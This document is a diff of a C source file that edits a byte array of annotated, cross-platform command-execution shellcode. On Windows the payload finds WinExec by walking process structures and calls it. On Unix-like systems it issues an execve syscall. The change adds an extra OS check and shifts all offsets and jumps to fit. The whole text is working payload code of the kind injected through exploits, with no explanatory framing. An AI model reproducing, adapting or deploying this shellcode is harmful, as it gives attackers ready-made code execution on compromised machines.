@@ -40,7 +40,7 @@
 #endif
 
 #define CMD_LEN_OFS 0x10+1
-#define EXEC_SIZE 194
+#define EXEC_SIZE 198
 
 char exec[]= {
   /* 0000 */ "\x56"                         /* push esi                        */
@@ -54,9 +54,9 @@ char exec[]= {
   /* 000A */ "\x50"                         /* push eax                        */
   /* 000B */ "\x50"                         /* push eax                        */
   /* 000C */ "\x50"                         /* push eax                        */
-  /* 000D */ "\xeb\x37"                     /* jmp 0x46                        */
+  /* 000D */ "\xeb\x3b"                     /* jmp 0x4a                        */
   /* 000F */ "\x5f"                         /* pop edi                         */
-  /* 0010 */ "\xb1\x00"                     /* mov cl, 0x0                     */
+  /* 0010 */ "\xb1\x07"                     /* mov cl, 0x7                     */
   /* 0012 */ "\x50"                         /* push eax                        */
   /* 0013 */ "\x57"                         /* push edi                        */
   /* 0014 */ "\xf2\xae"                     /* repne scasb                     */
@@ -71,11 +71,11 @@ char exec[]= {
   /* 0020 */ "\x41"                         /* inc ecx                         */
   /* 0021 */ "\xe3\x12"                     /* jecxz 0x35                      */
   /* 0023 */ "\x66\x8c\xe9"                 /* mov cx, gs                      */
-  /* 0026 */ "\xe3\x20"                     /* jecxz 0x48                      */
+  /* 0026 */ "\xe3\x24"                     /* jecxz 0x4c                      */
   /* 0028 */ "\x54"                         /* push esp                        */
   /* 0029 */ "\x58"                         /* pop eax                         */
   /* 002A */ "\xc1\xe8\x18"                 /* shr eax, 0x18                   */
-  /* 002D */ "\x74\x19"                     /* jz 0x48                         */
+  /* 002D */ "\x74\x1d"                     /* jz 0x4c                         */
   /* 002F */ "\xb0\x0b"                     /* mov al, 0xb                     */
   /* 0031 */ "\x5b"                         /* pop ebx                         */
   /* 0032 */ "\x59"                         /* pop ecx                         */
@@ -84,77 +84,79 @@ char exec[]= {
   /* 0037 */ "\x5f"                         /* pop edi                         */
   /* 0038 */ "\x0f\x05"                     /* syscall                         */
   /* 003A */ "\x3c\x05"                     /* cmp al, 0x5                     */
-  /* 003C */ "\x6a\x3b"                     /* push 0x3b                       */
-  /* 003E */ "\x58"                         /* pop eax                         */
-  /* 003F */ "\x99"                         /* cdq                             */
-  /* 0040 */ "\x74\x06"                     /* jz 0x48                         */
-  /* 0042 */ "\x5f"                         /* pop edi                         */
-  /* 0043 */ "\x5e"                         /* pop esi                         */
-  /* 0044 */ "\x0f\x05"                     /* syscall                         */
-  /* 0046 */ "\xeb\x75"                     /* jmp 0xbd                        */
-  /* 0048 */ "\x58"                         /* pop eax                         */
-  /* 0049 */ "\x58"                         /* pop eax                         */
-  /* 004A */ "\x58"                         /* pop eax                         */
-  /* 004B */ "\x58"                         /* pop eax                         */
-  /* 004C */ "\x59"                         /* pop ecx                         */
+  /* 003C */ "\x74\x0e"                     /* jz 0x4c                         */
+  /* 003E */ "\x3c\x08"                     /* cmp al, 0x8                     */
+  /* 0040 */ "\x74\x0a"                     /* jz 0x4c                         */
+  /* 0042 */ "\x6a\x3b"                     /* push 0x3b                       */
+  /* 0044 */ "\x58"                         /* pop eax                         */
+  /* 0045 */ "\x99"                         /* cdq                             */
+  /* 0046 */ "\x5f"                         /* pop edi                         */
+  /* 0047 */ "\x5e"                         /* pop esi                         */
+  /* 0048 */ "\x0f\x05"                     /* syscall                         */
+  /* 004A */ "\xeb\x75"                     /* jmp 0xc1                        */
+  /* 004C */ "\x58"                         /* pop eax                         */
   /* 004D */ "\x58"                         /* pop eax                         */
-  /* 004E */ "\x40"                         /* inc eax                         */
-  /* 004F */ "\x92"                         /* xchg edx, eax                   */
-  /* 0050 */ "\x74\x16"                     /* jz 0x68                         */
-  /* 0052 */ "\x50"                         /* push eax                        */
-  /* 0053 */ "\x51"                         /* push ecx                        */
-  /* 0054 */ "\x64\x8b\x72\x2f"             /* mov esi, [fs:edx+0x2f]          */
-  /* 0058 */ "\x8b\x76\x0c"                 /* mov esi, [esi+0xc]              */
-  /* 005B */ "\x8b\x76\x0c"                 /* mov esi, [esi+0xc]              */
-  /* 005E */ "\xad"                         /* lodsd                           */
-  /* 005F */ "\x8b\x30"                     /* mov esi, [eax]                  */
-  /* 0061 */ "\x8b\x7e\x18"                 /* mov edi, [esi+0x18]             */
-  /* 0064 */ "\xb2\x50"                     /* mov dl, 0x50                    */
-  /* 0066 */ "\xeb\x17"                     /* jmp 0x7f                        */
-  /* 0068 */ "\xb2\x60"                     /* mov dl, 0x60                    */
-  /* 006A */ "\x65\x48"                     /* dec eax                         */
-  /* 006C */ "\x8b\x32"                     /* mov esi, [edx]                  */
-  /* 006E */ "\x48"                         /* dec eax                         */
-  /* 006F */ "\x8b\x76\x18"                 /* mov esi, [esi+0x18]             */
+  /* 004E */ "\x58"                         /* pop eax                         */
+  /* 004F */ "\x58"                         /* pop eax                         */
+  /* 0050 */ "\x59"                         /* pop ecx                         */
+  /* 0051 */ "\x58"                         /* pop eax                         */
+  /* 0052 */ "\x40"                         /* inc eax                         */
+  /* 0053 */ "\x92"                         /* xchg edx, eax                   */
+  /* 0054 */ "\x74\x16"                     /* jz 0x6c                         */
+  /* 0056 */ "\x50"                         /* push eax                        */
+  /* 0057 */ "\x51"                         /* push ecx                        */
+  /* 0058 */ "\x64\x8b\x72\x2f"             /* mov esi, [fs:edx+0x2f]          */
+  /* 005C */ "\x8b\x76\x0c"                 /* mov esi, [esi+0xc]              */
+  /* 005F */ "\x8b\x76\x0c"                 /* mov esi, [esi+0xc]              */
+  /* 0062 */ "\xad"                         /* lodsd                           */
+  /* 0063 */ "\x8b\x30"                     /* mov esi, [eax]                  */
+  /* 0065 */ "\x8b\x7e\x18"                 /* mov edi, [esi+0x18]             */
+  /* 0068 */ "\xb2\x50"                     /* mov dl, 0x50                    */
+  /* 006A */ "\xeb\x17"                     /* jmp 0x83                        */
+  /* 006C */ "\xb2\x60"                     /* mov dl, 0x60                    */
+  /* 006E */ "\x65\x48"                     /* dec eax                         */
+  /* 0070 */ "\x8b\x32"                     /* mov esi, [edx]                  */
   /* 0072 */ "\x48"                         /* dec eax                         */
-  /* 0073 */ "\x8b\x76\x10"                 /* mov esi, [esi+0x10]             */
+  /* 0073 */ "\x8b\x76\x18"                 /* mov esi, [esi+0x18]             */
   /* 0076 */ "\x48"                         /* dec eax                         */
-  /* 0077 */ "\xad"                         /* lodsd                           */
-  /* 0078 */ "\x48"                         /* dec eax                         */
-  /* 0079 */ "\x8b\x30"                     /* mov esi, [eax]                  */
-  /* 007B */ "\x48"                         /* dec eax                         */
-  /* 007C */ "\x8b\x7e\x30"                 /* mov edi, [esi+0x30]             */
-  /* 007F */ "\x03\x57\x3c"                 /* add edx, [edi+0x3c]             */
-  /* 0082 */ "\x8b\x5c\x17\x28"             /* mov ebx, [edi+edx+0x28]         */
-  /* 0086 */ "\x8b\x74\x1f\x20"             /* mov esi, [edi+ebx+0x20]         */
-  /* 008A */ "\x48"                         /* dec eax                         */
-  /* 008B */ "\x01\xfe"                     /* add esi, edi                    */
-  /* 008D */ "\x8b\x54\x1f\x24"             /* mov edx, [edi+ebx+0x24]         */
-  /* 0091 */ "\x0f\xb7\x2c\x17"             /* movzx ebp, word [edi+edx]       */
-  /* 0095 */ "\x48"                         /* dec eax                         */
-  /* 0096 */ "\x8d\x52\x02"                 /* lea edx, [edx+0x2]              */
-  /* 0099 */ "\xad"                         /* lodsd                           */
-  /* 009A */ "\x81\x3c\x07\x57\x69\x6e\x45" /* cmp dword [edi+eax], 0x456e6957 */
-  /* 00A1 */ "\x75\xee"                     /* jnz 0x91                        */
-  /* 00A3 */ "\x8b\x74\x1f\x1c"             /* mov esi, [edi+ebx+0x1c]         */
-  /* 00A7 */ "\x48"                         /* dec eax                         */
-  /* 00A8 */ "\x01\xfe"                     /* add esi, edi                    */
-  /* 00AA */ "\x8b\x34\xae"                 /* mov esi, [esi+ebp*4]            */
-  /* 00AD */ "\x48"                         /* dec eax                         */
-  /* 00AE */ "\x01\xf7"                     /* add edi, esi                    */
-  /* 00B0 */ "\x99"                         /* cdq                             */
-  /* 00B1 */ "\xff\xd7"                     /* call edi                        */
-  /* 00B3 */ "\x58"                         /* pop eax                         */
-  /* 00B4 */ "\x58"                         /* pop eax                         */
-  /* 00B5 */ "\x58"                         /* pop eax                         */
-  /* 00B6 */ "\x58"                         /* pop eax                         */
+  /* 0077 */ "\x8b\x76\x10"                 /* mov esi, [esi+0x10]             */
+  /* 007A */ "\x48"                         /* dec eax                         */
+  /* 007B */ "\xad"                         /* lodsd                           */
+  /* 007C */ "\x48"                         /* dec eax                         */
+  /* 007D */ "\x8b\x30"                     /* mov esi, [eax]                  */
+  /* 007F */ "\x48"                         /* dec eax                         */
+  /* 0080 */ "\x8b\x7e\x30"                 /* mov edi, [esi+0x30]             */
+  /* 0083 */ "\x03\x57\x3c"                 /* add edx, [edi+0x3c]             */
+  /* 0086 */ "\x8b\x5c\x17\x28"             /* mov ebx, [edi+edx+0x28]         */
+  /* 008A */ "\x8b\x74\x1f\x20"             /* mov esi, [edi+ebx+0x20]         */
+  /* 008E */ "\x48"                         /* dec eax                         */
+  /* 008F */ "\x01\xfe"                     /* add esi, edi                    */
+  /* 0091 */ "\x8b\x54\x1f\x24"             /* mov edx, [edi+ebx+0x24]         */
+  /* 0095 */ "\x0f\xb7\x2c\x17"             /* movzx ebp, word [edi+edx]       */
+  /* 0099 */ "\x48"                         /* dec eax                         */
+  /* 009A */ "\x8d\x52\x02"                 /* lea edx, [edx+0x2]              */
+  /* 009D */ "\xad"                         /* lodsd                           */
+  /* 009E */ "\x81\x3c\x07\x57\x69\x6e\x45" /* cmp dword [edi+eax], 0x456e6957 */
+  /* 00A5 */ "\x75\xee"                     /* jnz 0x95                        */
+  /* 00A7 */ "\x8b\x74\x1f\x1c"             /* mov esi, [edi+ebx+0x1c]         */
+  /* 00AB */ "\x48"                         /* dec eax                         */
+  /* 00AC */ "\x01\xfe"                     /* add esi, edi                    */
+  /* 00AE */ "\x8b\x34\xae"                 /* mov esi, [esi+ebp*4]            */
+  /* 00B1 */ "\x48"                         /* dec eax                         */
+  /* 00B2 */ "\x01\xf7"                     /* add edi, esi                    */
+  /* 00B4 */ "\x99"                         /* cdq                             */
+  /* 00B5 */ "\xff\xd7"                     /* call edi                        */
   /* 00B7 */ "\x58"                         /* pop eax                         */
-  /* 00B8 */ "\x5d"                         /* pop ebp                         */
-  /* 00B9 */ "\x5b"                         /* pop ebx                         */
-  /* 00BA */ "\x5f"                         /* pop edi                         */
-  /* 00BB */ "\x5e"                         /* pop esi                         */
-  /* 00BC */ "\xc3"                         /* ret                             */
-  /* 00BD */ "\xe8\x4d\xff\xff\xff"         /* call 0xf                        */
+  /* 00B8 */ "\x58"                         /* pop eax                         */
+  /* 00B9 */ "\x58"                         /* pop eax                         */
+  /* 00BA */ "\x58"                         /* pop eax                         */
+  /* 00BB */ "\x58"                         /* pop eax                         */
+  /* 00BC */ "\x5d"                         /* pop ebp                         */
+  /* 00BD */ "\x5b"                         /* pop ebx                         */
+  /* 00BE */ "\x5f"                         /* pop edi                         */
+  /* 00BF */ "\x5e"                         /* pop esi                         */
+  /* 00C0 */ "\xc3"                         /* ret                             */
+  /* 00C1 */ "\xe8\x49\xff\xff\xff"         /* call 0xf                        */
 };
 
 // save code to binary file
